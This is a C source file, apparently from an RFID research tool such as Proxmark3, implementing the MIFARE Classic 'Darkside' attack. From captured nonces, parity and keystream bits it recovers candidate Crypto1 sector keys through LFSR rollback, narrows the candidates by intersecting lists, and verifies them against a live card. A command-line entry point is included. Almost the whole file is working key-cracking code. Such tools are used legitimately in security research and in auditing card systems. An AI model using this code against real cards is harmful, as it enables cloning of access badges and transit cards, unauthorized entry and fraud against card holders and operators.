//-----------------------------------------------------------------------------
// Merlok - June 2011
// Roel - Dec 2009
// Unknown author
//
// This code is licensed to you under the terms of the GNU GPL, version 2 or,
// at your option, any later version. See the LICENSE.txt file for the text of
// the license.
//-----------------------------------------------------------------------------
// MIFARE Darkside hack
//-----------------------------------------------------------------------------

#include <inttypes.h>
#include <stdio.h>
#include "crapto1/crapto1.h"

#if !defined(STANDALONE_TOOL)
#include <stdlib.h>
#include "mifarehost.h"
#include "util.h"
#include "ui.h"


static int compar_state(const void * a, const void * b) {
	// didn't work: (the result is truncated to 32 bits)
	//return (*(int64_t*)b - *(int64_t*)a);

	// better:
	if (*(int64_t*)b == *(int64_t*)a) return 0;
	else if (*(int64_t*)b > *(int64_t*)a) return 1;
	else return -1;
}
#endif

int nonce2key(uint32_t uid, uint32_t nt, uint32_t nr, uint64_t par_info, uint64_t ks_info, uint64_t * key) 
{
#if !defined(STANDALONE_TOOL)
	static uint32_t last_uid;
	static int64_t *last_keylist;
#endif
	struct Crypto1State *state;
	uint32_t i, pos, rr, nr_diff;
	uint8_t bt, ks3x[8], par[8][8];
	uint64_t key_recovered;
	static uint32_t key_count = 0;
	int64_t *state_s;
	rr = 0;
  
#if !defined(STANDALONE_TOOL)
	if (par_info == 0) {
		printf("Parity is all zero, trying special attack! Just wait for few more seconds...");
	}  
	if (last_uid != uid && last_keylist != NULL) {
		free(last_keylist);
		last_keylist = NULL;
	}
	last_uid = uid;
	PrintAndLog("\nuid(%08x) nt(%08x) nr(%08" PRIx32") par(%016" PRIx64") ks(%016" PRIx64")\n\n", uid, nt, nr, par_info, ks_info);
#endif
  // Reset the last three significant bits of the reader nonce
	nr &= 0xffffff1f;

	for (pos=0; pos<8; pos++) {
		ks3x[7-pos] = (ks_info >> (pos*8)) & 0x0f;
		bt = (par_info >> (pos*8)) & 0xff;
		for (i=0; i<8; i++) {
			par[7-pos][i] = (bt >> i) & 0x01;
		}
	}

	printf("|diff|{nr}    |ks3|ks3^5|parity         |\n");
	printf("+----+--------+---+-----+---------------+\n");
	for (i=0; i<8; i++) {
		nr_diff = nr | i << 5;
		printf("| %02x |%08x|",i << 5, nr_diff);
		printf(" %01x |  %01x  |",ks3x[i], ks3x[i]^5);
		for (pos=0; pos<7; pos++) 
			printf("%01x,", par[i][pos]);
		printf("%01x|\n", par[i][7]);
	}
	printf("\n");

	state = lfsr_common_prefix(nr, rr, ks3x, par);
	state_s = (int64_t*)state;
	
	//char filename[50] ;
    //sprintf(filename, "nt_%08x_%d.txt", nt, nr);
    //printf("name %s\n", filename);
	//FILE* fp = fopen(filename,"w");
	for (i = 0; (state) && ((state + i)->odd != -1); i++) {
		lfsr_rollback_word(state+i, uid^nt, 0);
		crypto1_get_lfsr(state + i, &key_recovered);
		*(state_s + i) = key_recovered;
#if defined(STANDALONE_TOOL)
		if (i < 20) {
			printf("Possible key: %012" PRIx64 "\n", key_recovered);
		}
#endif
	}

#if defined(STANDALONE_TOOL)
	if (i == 0) {
		printf("No key found\n\n");
	} else if (i >= 20) {
		printf(" ... and %u more. You would need to run multiple times with different <nr> and calculate the intersection.\n", key_count - 20);
	}
#endif	
	//fclose(fp);
	
	if(!state)
		return 1;
	
#if !defined(STANDALONE_TOOL)  
	qsort(state_s, i, sizeof(*state_s), compar_state);
	*(state_s + i) = -1;
	
	if (par_info == 0) {
		if (last_keylist != NULL) {
			//Create the intersection:
			int64_t *p1, *p2, *p3;
			p1 = p3 = last_keylist; 
			p2 = state_s;
			while ( *p1 != -1 && *p2 != -1 ) {
				if (compar_state(p1, p2) == 0) {
					printf("p1:%" PRIx64" p2:%" PRIx64 " p3:%" PRIx64" key:%012" PRIx64 "\n",(uint64_t)(p1-last_keylist),(uint64_t)(p2-state_s),(uint64_t)(p3-last_keylist),*p1);
					*p3++ = *p1++;
					p2++;
				}
				else {
					while (compar_state(p1, p2) == -1) ++p1;
					while (compar_state(p1, p2) == 1) ++p2;
				}
			}
			key_count = p3 - last_keylist;
		} else {
			key_count = 0;
		}
	} else {
		last_keylist = state_s;
		key_count = i;
	}

	printf("key_count:%d\n", key_count);

	// The list may still contain several key candidates. Test each of them with mfCheckKeys
	for (i = 0; i < key_count; i++) {
		uint8_t keyBlock[6];
		uint64_t key64;
		key64 = *(last_keylist + i);
		num_to_bytes(key64, 6, keyBlock);
		key64 = 0;
		if (!mfCheckKeys(0, 0, false, 1, keyBlock, &key64)) {
			*key = key64;
			free(last_keylist);
			last_keylist = NULL;
			if (par_info == 0)
				free(state);
			return 0;
		}
	}	
	
	free(last_keylist);
	last_keylist = state_s;
	
	return 1;
#else
	crypto1_destroy(state);
	return 0;
#endif	
}


#if defined(STANDALONE_TOOL)
int main(const int argc, const char* argv[])
{
	uint32_t uid, nt, nr;
	uint64_t par_info;
	uint64_t ks_info;
	uint64_t key;
	
	if (argc < 6) {
		printf("\nsyntax: %s <uid> <nt> <nr> <par> <ks>\n\n",argv[0]);
		return 1;
	}

	sscanf(argv[1],"%08x", &uid);
	sscanf(argv[2],"%08x", &nt);
	sscanf(argv[3],"%08x", &nr);
	sscanf(argv[4],"%016" SCNx64,&par_info);
	sscanf(argv[5],"%016" SCNx64,&ks_info);
	
	return nonce2key(uid, nt, nr, par_info, ks_info, &key);

}
#endif